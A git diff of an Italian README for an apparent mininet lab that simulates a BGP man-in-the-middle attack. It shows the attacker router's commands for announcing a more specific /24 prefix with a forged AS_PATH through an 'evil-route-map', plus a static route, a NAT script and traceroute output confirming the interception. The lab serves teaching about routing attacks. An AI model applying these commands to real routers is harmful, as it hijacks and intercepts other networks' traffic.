@@ -46,7 +46,11 @@ La topologia presenta sei AS (AS100, AS200, AS10, AS20, AS30, AS40) ognuno gesti
 
 L'attaccante R100 vuole fare da man-in-the-middle tra la rete 10.200.0.0/22 ospitata dall'AS200 e gli host appartenenti agli AS AS40 e AS30.
 
-Quando la rete è stabile, il traffico instradato verso la rete 10.200.0.0/22 segue i path descritti dalla figura che segue. Vediamo quale AS_PATH rispetta ciascun AS per raggiungerla.
+Quando la rete è stabile, il traffico instradato verso la rete 10.200.0.0/22 segue i path descritti dalla figura che segue.
+
+![topologia](./images/bgp-mitm-pre-attack.png)
+
+Quindi ciascun AS sceglie i seguenti AS_PATH per raggiungerla.
 
 |AS|AS_PATH|
 |-|-|
@@ -56,9 +60,7 @@ Quando la rete è stabile, il traffico instradato verso la rete 10.200.0.0/22 se
 |AS40	|AS30, AS200|
 |AS100	|AS10, AS20, AS200|
 
-![topologia](./images/bgp-mitm-pre-attack.png)
-
-L'attaccante R100 annuncia la rete 10.200.0.0 con una subnet più specifica. Quindi invece che una /22 annuncia una /24. Quetsto è possibile sfruttando una route-map.
+L'attaccante R100 annuncia la rete 10.200.0.0 con una subnet più specifica. Quindi invece che una /22 annuncia una /24. Questo è possibile sfruttando una route-map.
 
 <!-- https://www.examcollection.com/certification-training/ccnp-concept-of-route-maps.html -->
 
@@ -67,12 +69,12 @@ L'attaccante R100 annuncia la rete 10.200.0.0 con una subnet più specifica. Qui
 > Per quanto riguarda le differenze, le route-map sono più flessibili delle ACL e possono eseguire dei controlli sulle rotte in base a criteri non disponibili per le ACL. Il risultato dell'applicazione di un'ACL è sì o no, quindi consente o meno la redistribuzione della rotta. Mentre la route-map non solo permette o nega la redistribuzione ma è in grado di modificare le informazioni associate alla rotta.
 
 Gli AS sceglieranno la rotta più specifica per inoltrare il traffico, quindi la /24.
+L'attaccante R100 deve installare una rotta statica per la rete 10.200.0.0/24 verso AS10.
+Inoltre deve fare NATting dell'indirizzo IP sorgente del traffico proveniente dai prefissi annunciati da AS30 e AS40, convertendolo nell'indirizzo IP della sua interfaccia con cui è connesso con AS10.
 
-L'attaccante R100 deve installare una rotta statica per la rete 10.200.0.0/24 verso AS10. Infatti quando riceve il traffico originato da AS40 o AS30 e destinato a AS200, lo deve inoltrare ad AS10.
+A seguito dell'attacco gli AS_PATH scelti da ciascun AS per raggiungere la rete 10.200.0.0/24 risultano i seguenti.
 
 ![topologia](./images/bgp-mitm-post-attack.png)
-
-A seguito dell'attacco gli AS_PATH rispettati da ciascun AS per raggiungere la rete 10.200.0.0/24 risultano i seguenti.
 
 |AS|AS_PATH|
 |-|-|
@@ -82,11 +84,9 @@ A seguito dell'attacco gli AS_PATH rispettati da ciascun AS per raggiungere la r
 |AS40	|AS100|
 |AS100	|AS10, AS20, AS200|
 
-Vediamo che gli AS30 e AS40 suppongono che la rete 10.200.0.0/24 sia ospitata dall'AS100. Quindi il traffico in partenza da AS30 e AS40 destinato alla rete 10.200.0.0/24 viene inoltrato all'AS100, che lo gestirà usando la rotta statica precedentemente impostata inoltrando il traffico verso l'AS10.
+Gli AS30 e AS40 suppongono che la rete 10.200.0.0/24 sia ospitata dall'AS100. Quindi il traffico in partenza da AS30 e AS40 destinato alla rete 10.200.0.0/24 viene inoltrato all'AS100, che lo gestirà usando la rotta statica e la regola di NAT inoltrandolo verso l'AS10.
 
 ## Esecuzione dell'attacco
-
-Per provare la simulazione, seguiamo i seguenti passi.
 
 **. Avviamo l'ambiente di simulazione.**
 
@@ -96,7 +96,7 @@ Avviamo le istanze dei router, degli AS e degli host eseguendo il comando.
 
 **. Accediamo al daemon bgp.**
 
-In un altro terminale avviamo una sessione con il daemon bgp dell'AS100. La password per accedere come utente è `en`. 
+In un altro terminale avviamo una sessione con il daemon bgp dell'AS100. La password per accedere è `en`. 
 
 `$ ./connect-bgp.sh`
 
@@ -134,7 +134,7 @@ Output:
 	
 	Displayed  6 out of 9 total prefixes
 
-Dall'output riusciamo a capire se l'AS100 per raggiungere la rete 10.200.0.0/22 sceglie il path "10 20 200" (caso 1) oppure il path "40 30 200" (caso 2). Qui ricadiamo nel caso 1.
+Dall'output capiamo che l'AS100 sceglie il path "10 20 200" per raggiungere la rete 10.200.0.0/22.
 
 **. Accediamo al daemon zebra.**
 
@@ -173,11 +173,11 @@ Output:
 	C>* 127.0.0.0/8 is directly connected, lo
 	C>* 127.0.0.1/32 is directly connected, lo
 
-Vediamo che per raggiungere la rete 10.200.0.0/22 R100 usa una rotta appresa tramite BGP passando attraverso l'AS10 (il router dirimpettaio R10 ha indirizzo IP 10.10.110.1).
+Vediamo che R100 usa una rotta appresa tramite BGP passando attraverso l'AS10 (il router dirimpettaio R10 ha indirizzo IP 10.10.110.1) per raggiungere la rete 10.200.0.0/22.
 
 **. Lanciamo l'attacco.**
 
-Imponiamo la route-map. Nella shell bgp di R100 lanciamo i seguenti comandi (caso 1)
+Imponiamo la route-map. Nella shell bgp di R100 lanciamo i seguenti comandi:
 
 	bgpd-R100# configure terminal
 	
@@ -185,39 +185,25 @@ Imponiamo la route-map. Nella shell bgp di R100 lanciamo i seguenti comandi (cas
 	bgpd-R100(config)#   network 10.200.0.0/24
 	##################   la rete viene annunciata ai vicini
 	bgpd-R100(config)#   neighbor 10.10.110.1 route-map evil-route-map out
-	##################   la route-map viene applicata verso l'AS10
+	##################   la route-map viene applicata in output verso l'AS10
 	bgpd-R100(config)#   exit
 	bgpd-R100(config)# ip prefix-list evil-prefix-list permit 10.200.0.0/24
-	################## definizione della prefix-list
+	################## definizione di prefissi da attaccare
 	bgpd-R100(config)# route-map evil-route-map permit 10
 	################## definizione della route-map
 	bgpd-R100(config)#   match ip address prefix-list evil-prefix-list
-	##################   restringe la route-map ai soli indirizzi che fanno match con la prefix-list
+	##################   restringe la route-map ai soli prefissi da attaccare
 	bgpd-R100(config)#   set as-path prepend 10 20 200
-	##################   azione da applicare agli annunci che fanno match
+	##################   azione da applicare
 
-oppure (caso 2)
-
-	bgpd-R100# configure terminal
-	
-	bgpd-R100(config)# router bgp 100
-	bgpd-R100(config)#   network 10.200.0.0/24
-	bgpd-R100(config)#   neighbor 10.10.140.1 route-map evil-route-map out
-	bgpd-R100(config)#   exit
-	bgpd-R100(config)# ip prefix-list evil-prefix-list permit 10.200.0.0/24
-	bgpd-R100(config)# route-map evil-route-map permit 10
-	bgpd-R100(config)#   match ip address prefix-list evil-prefix-list
-	bgpd-R100(config)#   set as-path prepend 40 30 200
-
-Impostiamo la rotta statica. Nella shell zebra di R100 lanciamo i seguenti comandi (caso 1)
+Impostiamo la rotta statica. Nella shell zebra di R100 lanciamo i seguenti comandi:
 
 	R100# configure terminal
 	R100(config)# ip route 10.200.0.0/24 10.10.110.1
 
-oppure (caso 2)
+Imponiamo le regole di NATting lanciando lo script:
 
-	R100# configure terminal
-	R100(config)# ip route 10.200.0.0/24 10.10.140.1
+`$ ./R100-nat.sh`
 
 **. Controlliamo le scelte di routing degli AS**
 
@@ -241,7 +227,7 @@ Accediamo al daemon bgp di R40 (`./connect-bgp.sh R40`) e la sua routing table (
 	
 	Displayed  7 out of 9 total prefixes
 	
-Vediamo che R40 inoltrerà il traffico verso la rete 10.200.0.0/24 attraverso l'AS100 invece che attraverso l'AS30.
+Vediamo che R40 inoltrerà il traffico verso la rete 10.200.0.0/24 ad AS100 invece che attraverso AS30.
 
 Analogamente per il daemon bgp di R30 risulta
 
@@ -264,28 +250,45 @@ Analogamente per il daemon bgp di R30 risulta
 	
 	Displayed  7 out of 10 total prefixes
 
-Vediamo che R30 inoltrerà il traffico verso la rete 10.200.0.0/24 attraverso l'AS40 invece che direttamente all'AS200.
+Vediamo che R30 inoltrerà il traffico verso la rete 10.200.0.0/24 ad AS40 invece che direttamente ad AS200.
 
 **. Verifichiamo la raggiungibilità degli host tramite ping.**
 
-In un altro terminale lanciamo il seguente script
+In un altro terminale lanciamo il seguente script:
 
-`$ ./ping.sh`
+`$ ./test-traceroute.sh`
 
-Questo esegue un songolo ping dagli host presenti negli AS AS100, AS40 e AS30 verso gli host presenti nell'AS AS200.
+Questo esegue `traceroute` dagli host presenti in ogni AS verso gli host presenti nell'AS AS200.
+Gli output interessanti sono i seguenti.
+
+	########## 10.40.0.1 traceroute 10.200.0.1 ##########
+	traceroute to 10.200.0.1 (10.200.0.1), 10 hops max, 60 byte packets
+	 1  10.40.0.254  0.053 ms  0.018 ms  0.018 ms
+	 2  9.0.140.2  0.035 ms  0.027 ms  0.027 ms
+	 3  9.0.110.1  0.049 ms  0.038 ms  0.037 ms
+	 4  9.0.30.2  0.086 ms  0.048 ms  0.047 ms
+	 5  * * *
+	 6  10.200.0.1  0.070 ms  0.066 ms  0.064 ms
+
+	########## 10.30.0.1 traceroute 10.200.0.1 ##########
+	traceroute to 10.200.0.1 (10.200.0.1), 10 hops max, 60 byte packets
+	 1  10.30.0.254  0.055 ms  0.018 ms  0.017 ms
+	 2  9.0.70.2  0.036 ms  0.028 ms  0.028 ms
+	 3  9.0.140.2  0.044 ms  0.036 ms  0.035 ms
+	 4  9.0.110.1  0.058 ms  0.049 ms  0.089 ms
+	 5  * * *
+	 6  * * *
+	 7  10.200.0.1  0.095 ms  0.139 ms  0.145 ms
+
+Gli asterschi sono dovuti ad una mancata risposta per i particolari TTL (per il primo output 5, per il secondo 5,6).
 
 **. Fermiamo l'ambiente di simulazione.**
 
-Fermiamo il terminali connessi a R100.
-
-`bgpd-R100# exit`
-
-`R100# exit`
-
-Fermiamo le istanze digitando exit nel terminale di mininet.
+Fermiamo le istanze dal terminale di mininet:
 
 `mininet> exit`
 
+<!--
 # UPDATE scambiati tra i router
 
 Prima dell'attacco AS10 annuncia ad AS100 la raggiungibilità della rete 10.200.0.0/22 attraverso gli AS AS10, AS20, AS200
@@ -385,3 +388,4 @@ R20 inoltra il traffico per 10.200.0.0/24 verso l'AS200
 ![100pings200](./images/ping8-100pings200.png)
 
 ![40pings200](./images/ping9-40pings200.png)
+-->
